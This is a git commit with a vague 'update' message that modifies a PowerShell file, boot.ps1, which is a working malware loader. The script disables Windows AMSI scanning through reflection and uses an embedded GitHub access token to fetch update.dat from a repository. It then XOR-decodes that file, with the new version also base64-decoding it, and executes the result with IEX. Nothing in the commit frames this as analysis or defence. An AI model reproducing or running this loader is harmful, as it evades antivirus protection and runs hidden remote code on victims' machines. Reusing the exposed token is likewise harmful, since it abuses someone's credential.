e49e7b90ddc531db8459187c36610e39cef543a0
Tokenairdrop527 <jonasraabjerg656@gmail.com>
2026-04-30 20:03:41 +0200

    update

--- boot.ps1
+++ boot.ps1
@@ -1,5 +1,6 @@
 try{$t=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$b=[Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static;$f=$t.GetField("amsiContext",$b);$p=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($p,0)}catch{}
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 $h=@{Authorization='token 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';Accept='application/vnd.github.v3.raw'}
-$b=(Invoke-WebRequest 'https://api.github.com/repos/Tokenairdrop527/update/contents/update.dat' -Headers $h -UseBasicParsing).Content
-IEX([Text.Encoding]::UTF8.GetString(($b|%{$_-bxor0xAE})))
+$b64=(Invoke-RestMethod -Uri 'https://api.github.com/repos/Tokenairdrop527/update/contents/update.dat' -Headers $h)
+$bytes=[Convert]::FromBase64String($b64)
+IEX([Text.Encoding]::UTF8.GetString(($bytes|%{$_-bxor0xAE})))
